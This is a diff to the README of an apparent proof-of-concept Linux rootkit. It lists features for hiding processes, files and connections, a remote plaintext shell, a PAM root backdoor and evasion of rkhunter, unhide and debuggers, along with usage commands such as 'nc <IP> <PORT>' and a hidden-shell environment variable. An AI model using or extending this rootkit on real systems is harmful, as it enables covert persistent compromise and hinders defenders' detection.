@@ -15,7 +15,9 @@ This poc is based on: [azazel](https://github.com/chokepoint/azazel)
 - Hides processes, files, directories and network connections
 - Open remote terminal (plaintext) with password
 - Add PAM backdoor for local root access
-- Avoids unhide, rkhunter and local sniffing
+- Block some binaries to avoid analysis
+- Hides from the rkhunter and unhide
+- Avoids local sniffing
 - Exit on debug
 
 ## Access remote backdoor
@@ -29,12 +31,14 @@ nc <IP> <PORT>
 
 ```sh
 sudo -u <USER> -s
+
+export HIDE_THIS_SHELL=foobar // to be owner
 ```
 
 ## Update hash db 
 
 ```sh
-sha256sum <BIN> >> /etc/__tmphashtable
+make -f Makefile.rootkit update-hashdb
 ```
 
 ## Checks
